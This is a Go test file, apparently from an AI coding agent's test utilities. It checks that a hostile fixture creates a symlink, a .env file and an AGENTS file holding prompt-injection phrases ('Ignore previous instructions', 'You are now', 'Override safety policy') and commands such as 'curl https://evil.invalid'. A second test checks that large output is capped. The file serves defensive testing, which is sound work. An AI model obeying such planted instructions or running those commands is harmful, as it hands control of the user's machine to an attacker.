package testutil

import (
	"os"
	"strings"
	"testing"
)

func TestHostileSecurityFixtureCreatesExpectedHostileInputs(t *testing.T) {
	fixture := NewHostileSecurityFixture(t)
	if _, err := os.Lstat(fixture.SymlinkPath); err != nil {
		t.Fatalf("symlink fixture missing: %v", err)
	}
	agents, err := os.ReadFile(fixture.AgentsPath)
	if err != nil {
		t.Fatalf("read AGENTS fixture: %v", err)
	}
	text := string(agents)
	for _, want := range []string{"Ignore previous instructions", "You are now", "Override safety policy", "touch /tmp/nexdev-owned-bad", "curl https://evil.invalid"} {
		if !strings.Contains(text, want) {
			t.Fatalf("AGENTS fixture missing %q: %s", want, text)
		}
	}
	env, err := os.ReadFile(fixture.EnvPath)
	if err != nil {
		t.Fatalf("read .env fixture: %v", err)
	}
	if string(env) != EnvFileContent() {
		t.Fatalf(".env fixture = %q", env)
	}
}

func TestUnboundedStdoutFixtureCanBeCapped(t *testing.T) {
	stdout := UnboundedStdout128KiB()
	if len(stdout) != 128*1024 {
		t.Fatalf("stdout fixture length = %d", len(stdout))
	}
	tail, truncated := CapOutputForFixture(stdout, 4096)
	if !truncated || len(tail) != 4096 {
		t.Fatalf("cap result len=%d truncated=%v", len(tail), truncated)
	}
	if _, truncated := CapOutputForFixture("small", 4096); truncated {
		t.Fatal("small output should not be marked truncated")
	}
}
